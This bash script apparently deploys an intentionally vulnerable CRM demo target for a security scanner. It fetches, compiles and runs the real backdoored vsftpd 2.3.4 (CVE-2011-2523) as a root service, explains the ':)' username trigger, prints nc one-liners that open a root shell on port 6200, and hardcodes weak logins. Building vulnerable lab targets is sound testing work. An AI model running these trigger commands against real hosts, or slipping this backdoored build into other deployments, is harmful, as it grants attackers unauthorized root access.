#!/usr/bin/env bash
#
# Nimbus CRM -- one-shot deploy script (ThreatWeaver demo target).
#
# Run this ON YOUR OWN demo VM (e.g. the throwaway Azure box). It installs the
# Nimbus CRM app as a systemd service on port 80, and the REAL backdoored
# vsftpd 2.3.4 (CVE-2011-2523) on port 21.
#
# Usage:
#   chmod +x deploy.sh
#   sudo ./deploy.sh
#
# NOTE: this app intentionally contains realistic security flaws so the
# ThreatWeaver scanner has something to find. Only run it on a disposable
# machine you control and tear it down after the demo (see teardown below).

set -euo pipefail

APP_DIR="/opt/nimbus-crm"
SERVICE_NAME="nimbus-crm"
PORT="80"

echo "==> Installing system packages..."
if command -v apt-get >/dev/null 2>&1; then
    apt-get update -y
    apt-get install -y python3 python3-venv python3-pip iputils-ping \
        build-essential libpam0g-dev libcap-dev libssl-dev curl
elif command -v dnf >/dev/null 2>&1; then
    dnf install -y python3 python3-pip iputils \
        gcc make pam-devel libcap-devel openssl-devel curl
fi

echo "==> Copying application to ${APP_DIR}..."
mkdir -p "${APP_DIR}/templates"
cp "$(dirname "$0")/app.py" "${APP_DIR}/"
cp "$(dirname "$0")/requirements.txt" "${APP_DIR}/"
cp "$(dirname "$0")/templates/"*.html "${APP_DIR}/templates/"

echo "==> Creating virtualenv and installing dependencies..."
python3 -m venv "${APP_DIR}/venv"
"${APP_DIR}/venv/bin/pip" install --upgrade pip
"${APP_DIR}/venv/bin/pip" install -r "${APP_DIR}/requirements.txt"

echo "==> Seeding database and demo documents..."
"${APP_DIR}/venv/bin/python" - <<'PYEOF'
import sys
sys.path.insert(0, "/opt/nimbus-crm")
import app
app.init_db()
app.seed_docs()
print("seeded.")
PYEOF

echo "==> Writing systemd unit /etc/systemd/system/${SERVICE_NAME}.service..."
cat > "/etc/systemd/system/${SERVICE_NAME}.service" <<EOF
[Unit]
Description=Nimbus CRM (ThreatWeaver demo target)
After=network.target

[Service]
Type=simple
WorkingDirectory=${APP_DIR}
Environment=TW_NONCE=
ExecStart=${APP_DIR}/venv/bin/gunicorn --workers 1 --bind 0.0.0.0:${PORT} app:app
Restart=on-failure
MemoryMax=256M

[Install]
WantedBy=multi-user.target
EOF

echo "==> Enabling and starting the service..."
systemctl daemon-reload
systemctl enable "${SERVICE_NAME}"
systemctl restart "${SERVICE_NAME}"

# --- Real vsftpd 2.3.4 with CVE-2011-2523 backdoor ------------------------
# This is the ACTUAL trojanized vsftpd 2.3.4 that was distributed on the
# official vsftpd download site in July 2011. The backdoor works like this:
#   1. Client connects to port 21
#   2. Client sends: USER anything:)    (username ending with smiley face)
#   3. Client sends: PASS anything
#   4. The backdoor opens a root shell listener on port 6200
#   5. Client connects to port 6200 and gets an interactive root shell
#
# We compile it from the archived source (GitHub research mirror).
echo "==> Building vsftpd 2.3.4 (real backdoor, CVE-2011-2523) from source..."

# Stop any existing FTP service
systemctl stop vsftpd 2>/dev/null || true
systemctl disable vsftpd 2>/dev/null || true
systemctl stop vsftpd-backdoor 2>/dev/null || true

cd /tmp
rm -rf vsftpd-2.3.4*

VSFTPD_OK=false

if curl -fsSL --max-time 60 \
    "https://github.com/nikdubois/vsftpd-2.3.4-infected/archive/refs/heads/master.tar.gz" \
    -o vsftpd-src.tar.gz; then

    tar xzf vsftpd-src.tar.gz
    cd vsftpd-2.3.4-infected-master

    # Fix for modern glibc (libcrypt split out)
    sed -i 's|^LIBS\s*=.*|& -lcrypt|' Makefile 2>/dev/null || true

    if make -j"$(nproc)" 2>&1 | tail -3; then
        cp vsftpd /usr/local/sbin/vsftpd_234
        chmod 755 /usr/local/sbin/vsftpd_234
        VSFTPD_OK=true
        echo "    Built successfully: /usr/local/sbin/vsftpd_234"
    else
        echo "    ERROR: compilation failed."
    fi
else
    echo "    ERROR: could not download source tarball."
fi

cd /
rm -rf /tmp/vsftpd-2.3.4* /tmp/vsftpd-src*

if [ "$VSFTPD_OK" = true ]; then
    # Create required directories and config
    mkdir -p /etc/vsftpd /var/run/vsftpd/empty /srv/ftp/pub
    echo "Nimbus CRM file drop. Internal use only." > /srv/ftp/pub/README.txt
    echo "backup-2026-Q1.sql.gz placeholder" > /srv/ftp/pub/backup-info.txt
    id ftp >/dev/null 2>&1 || useradd -r -d /srv/ftp -s /usr/sbin/nologin ftp || true

    cat > /etc/vsftpd/vsftpd.conf <<'FTPCONF'
listen=YES
listen_port=21
anonymous_enable=YES
local_enable=NO
write_enable=NO
anon_root=/srv/ftp
secure_chroot_dir=/var/run/vsftpd/empty
dirmessage_enable=YES
xferlog_enable=YES
connect_from_port_20=YES
FTPCONF

    cat > /etc/systemd/system/vsftpd-backdoor.service <<'SVCEOF'
[Unit]
Description=vsftpd 2.3.4 (CVE-2011-2523 real backdoor)
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/sbin/vsftpd_234 /etc/vsftpd/vsftpd.conf
Restart=on-failure
RestartSec=2

[Install]
WantedBy=multi-user.target
SVCEOF

    systemctl daemon-reload
    systemctl enable vsftpd-backdoor
    systemctl restart vsftpd-backdoor
    sleep 1
    echo "    vsftpd 2.3.4 (REAL backdoor) is running on port 21."
    echo "    Trigger: USER x:) + PASS x  ->  root shell on port 6200"
else
    echo "    WARNING: vsftpd 2.3.4 could not be built. FTP service unavailable."
fi

sleep 2
echo
echo "==> Done. Service status:"
systemctl --no-pager status "${SERVICE_NAME}" | head -n 8 || true
echo
PUBLIC_IP="$(curl -s --max-time 5 ifconfig.me || echo '<your-server-ip>')"
echo "============================================================"
echo " Nimbus CRM is live on port ${PORT}."
echo "   Local check : curl http://localhost/"
echo "   From outside: http://${PUBLIC_IP}/"
echo "   Login       : admin / S3cur3Adm1n!  (or sales / letmein)"
echo
echo " vsftpd 2.3.4 (real backdoor) is on port 21."
echo "   Trigger: echo -e 'USER x:)\r\nPASS x\r\n' | nc ${PUBLIC_IP} 21"
echo "   Shell:   nc ${PUBLIC_IP} 6200"
echo
echo " Point ThreatWeaver at: ${PUBLIC_IP}  (or your DNS name)"
echo
echo " IMPORTANT: open these ports in your Azure NSG:"
echo "   80   = Nimbus CRM web app"
echo "   21   = vsftpd 2.3.4 (FTP with backdoor)"
echo "   6200 = backdoor shell (opens when triggered)"
echo
echo " Teardown after the demo:"
echo "   sudo systemctl disable --now ${SERVICE_NAME} vsftpd-backdoor"
echo "   sudo rm -rf ${APP_DIR} /etc/systemd/system/${SERVICE_NAME}.service"
echo "   sudo rm -rf /etc/systemd/system/vsftpd-backdoor.service"
echo "   sudo rm -rf /usr/local/sbin/vsftpd_234 /etc/vsftpd /srv/ftp"
echo "============================================================"
